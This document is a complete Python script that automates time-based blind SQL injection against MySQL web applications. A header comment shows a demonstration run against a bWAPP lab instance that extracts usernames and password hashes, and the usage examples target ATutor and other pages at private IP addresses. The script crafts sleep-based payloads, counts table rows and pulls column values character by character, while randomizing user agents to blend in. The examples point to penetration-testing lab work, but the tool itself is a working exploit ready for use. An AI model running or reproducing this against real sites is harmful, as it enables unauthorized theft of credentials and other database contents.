#!/usr/bin/python3
#
# DEMONSTRATION
# $ python3 sqli_mysql_timed_blind_v2.py title,action get "1'" "" login,password users http://192.168.252.5/bWAPP/sqli_15.php 2
# [?] Select a parameter to test for injection:: title
#  > title
#    action
#
# [*] Printing number of rows in table...
# 2
# [*] Found 2 rows of data in table 'users'
#
# [*] Retrieving 2 rows of data using 'login' as column and 'users' as table...
# [*] Extracting strings from row 1...
# A.I.M.
# [*] Retrieved value 'A.I.M. ' for column 'login' in row 1
# [*] Extracting strings from row 2...
# bee
# [*] Retrieved value 'bee' for column 'login' in row 2
# [*] Retrieving 2 rows of data using 'password' as column and 'users' as table...
# [*] Extracting strings from row 1...
# 6885858486f31043e5839c735d99457f045affd0
# [*] Retrieved value '6885858486f31043e5839c735d99457f045affd0' for column 'password' in row 1
# [*] Extracting strings from row 2...
# 6885858486f31043e5839c735d99457f045affd0
# [*] Retrieved value '6885858486f31043e5839c735d99457f045affd0' for column 'password' in row 2
# 
# [+] Done!

import requests
import urllib3
import os
import sys
import re
import inquirer
from random_useragent.random_useragent import Randomize     # Randomize useragent

# Optionally, use a proxy
# proxy = "http://<user>:<pass>@<proxy>:<port>"
proxy = "http://localhost:8080"
os.environ['http_proxy'] = proxy
os.environ['HTTP_PROXY'] = proxy
os.environ['https_proxy'] = proxy
os.environ['HTTPS_PROXY'] = proxy

# Disable cert warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Set timeout
timeout = 10

# Default string for empty values
def_str = "search"

# Specific settings for DBMS queries
junk_str = "ABCD"
and_or = "AND"

# Injection prefix and suffix
inj_prefix = and_or + " (select " + junk_str + " from (select(sleep("
inj_suffix = ")))))" + junk_str + ") AND '" + junk_str + "'='" + junk_str

# Decimal begin and end
dec_begin = 48
dec_end = 57

# ASCII char begin and end
ascii_begin = 32
ascii_end = 126

# Handle CTRL-C
def keyboard_interrupt():
    """Handles keyboardinterrupt exceptions"""
    print("\n\n[*] User requested an interrupt, exiting...")
    exit(0)

# Custom headers
def http_headers():
    # Randomize useragent
    useragent = Randomize().random_agent('desktop', 'windows')
    headers = {
        'User-Agent': useragent,
        # 'Cookie':'PHPSESSID=07f0cc1a65fe553e25f321170e896781; security_level=0',
    }
    return headers

# Perform the SQLi call for injection
def sqli(url,headers,get_post,inj_param,params,inj_str,sleep):
    comment_inj_str = re.sub(" ","/**/",inj_str)
    inj_params = dict()

    for param in params:
        inj_params[param] = def_str
        if param == inj_param:
            inj_params[param] = comment_inj_str

    inj_params_unencoded = "&".join("%s=%s" % (k,v) for k,v in inj_params.items())
    
    # Do GET or POST
    if get_post.lower() == "get":
        r = requests.get(url,params=inj_params_unencoded,headers=headers,timeout=timeout,verify=False)
    elif get_post.lower() == "post":
        r = requests.post(url,data=inj_params,headers=headers,timeout=timeout,verify=False)
    res = r.elapsed.total_seconds()
    if res >= sleep:
        return True
    elif res < sleep:
        return False
    else:
        print("[!] Something went wrong checking responses. Check responses manually. Exiting.")
        exit(-1)

# Extract rows
def get_rows(url,headers,get_post,prefix,suffix,inj_param,params,table,sleep):
    rows = ""
    max_pos_rows = 4
    # Get number maximum positional characters of rows: e.g. 1096,2122,1234,etc.
    for pos in range(1,max_pos_rows+1):
        # Test if current pos does have any valid value. If not, break
        direction = ">"
        inj_str = prefix + inj_prefix + str(sleep) + "-(if(ORD(MID((select IFNULL(CAST(COUNT(*) AS NCHAR),0x20) FROM " + table + ")," + str(pos) + ",1))" + direction + "1,0," + str(sleep) + inj_suffix + suffix
        if not sqli(url,headers,get_post,inj_param,params,inj_str,sleep):
            break
        # Loop decimals
        direction = "="
        for num_rows in range(dec_begin,dec_end+1):
            row_char = chr(num_rows)
            inj_str = prefix + inj_prefix + str(sleep) + "-(if(ORD(MID((select IFNULL(CAST(COUNT(*) AS NCHAR),0x20) FROM " + table + ")," + str(pos) + ",1))" + direction + str(num_rows) + ",0," + str(sleep) + inj_suffix + suffix
            if sqli(url,headers,get_post,inj_param,params,inj_str,sleep):
                rows += row_char
                print(row_char,end='',flush=True)
                break
    
    if rows != "":
        print("\n[*] Found " + rows + " rows of data in table '" + table + "'\n")
        return int(rows)
    else:
        return False

# Loop through positions and characters
def get_data(url,headers,get_post,prefix,suffix,inj_param,params,row,column,table,sleep):
    extracted = ""
    max_pos_len = 50
    # Loop through length of string
    # Not very efficient, should use a guessing algorithm
    print("[*] Extracting strings from row " + str(row+1) + "...")
    for pos in range(1,max_pos_len):
        # Test if current pos does have any valid value. If not, break
        direction = ">"
        inj_str = prefix + inj_prefix + str(sleep) + "-(if(ord(mid((select ifnull(cast(" + column + " as NCHAR),0x20) from " + table + " LIMIT " + str(row) + ",1)," + str(pos) + ",1))" + direction + str(ascii_begin) + ",0," + str(sleep) + inj_suffix + suffix
        if not sqli(url,headers,get_post,inj_param,params,inj_str,sleep):
            break
        # Loop through ASCII printable characters
        direction = "="
        for guess in range(ascii_begin,ascii_end+1):
            extracted_char = chr(guess)
            inj_str = prefix + inj_prefix + str(sleep) + "-(if(ord(mid((select ifnull(cast(" + column + " as NCHAR),0x20) from " + table + " LIMIT " + str(row) + ",1)," + str(pos) + ",1))" + direction + str(guess) + ",0," + str(sleep) + inj_suffix + suffix
            if sqli(url,headers,get_post,inj_param,params,inj_str,sleep):
                extracted += chr(guess)
                print(extracted_char,end='',flush=True)
                break
    return extracted

# Main
def main(argv):
    if len(sys.argv) == 9:
        params = sys.argv[1].split(",")
        get_post = sys.argv[2]
        prefix = sys.argv[3]
        suffix = sys.argv[4]
        columns = sys.argv[5].split(",")
        table = sys.argv[6]
        url = sys.argv[7]
        sleep = int(sys.argv[8])
    else:
        print("[*] Usage: " + sys.argv[0] + " <param1,param2,..> <get_or_post> <prefix> <suffix> <column1,column2,..> <table> <url> <sleep_in_seconds>\n")
        print("[*] Example: " + sys.argv[0] + " id get \"1 \" \"'#\" login,password users http://192.168.252.6/cat.php 1")
        print("[*] Example: " + sys.argv[0] + " q get \"1') \" \"'%23\" login,password AT_members http://192.168.252.12/ATutor/mods/_standard/social/index_public.php 2")
        print("[*] Example: " + sys.argv[0] + " title,action get \"1'\" \"\" login,password users http://192.168.252.5/bWAPP/sqli_15.php 2\n")
        exit(0)

    # Random headers
    headers = http_headers()

    # Do stuff
    try:
        # Select parameter
        param_question = [inquirer.List('params',
                message="Select a parameter to test for injection:",
                choices=params),]
        param_answer = inquirer.prompt(param_question)
        inj_param = param_answer["params"]

        # Getting rows
        print("[*] Printing number of rows in table...")
        rows = get_rows(url,headers,get_post,prefix,suffix,inj_param,params,table,sleep)
        if not rows:
            print("[!] Unable to retrieve rows, checks requests.\n")
            exit(-1)

        # Getting values for found rows in specified columns
        for column in columns:
            print("[*] Retrieving " + str(rows) + " rows of data using '" + column + "' as column and '" + table + "' as table...")
            for row in range(0,rows):
                # rowval_len = get_length(url,headers,row,column,table)
                retrieved = get_data(url,headers,get_post,prefix,suffix,inj_param,params,row,column,table,sleep)
                print("\n[*] Retrieved value '" + retrieved + "' for column '" + column + "' in row " + str(row+1))
        # Done
        print("\n[+] Done!\n")
    except requests.exceptions.Timeout:
        print("[!] Timeout error\n")
        exit(-1)
    except requests.exceptions.TooManyRedirects:
        print("[!] Too many redirects\n")
        exit(-1)
    except requests.exceptions.ConnectionError:
        print("[!] Not able to connect to URL\n")
        exit(-1)
    except requests.exceptions.RequestException as e:
        print("[!] " + str(e))
        exit(-1)
    except requests.exceptions.HTTPError as e:
        print("[!] Failed with error code - " + str(e.code) + "\n")
        exit(-1)
    except KeyboardInterrupt:
        keyboard_interrupt()
        exit(-1)

# If we were called as a program, go execute the main function.
if __name__ == "__main__":
    main(sys.argv[1:])
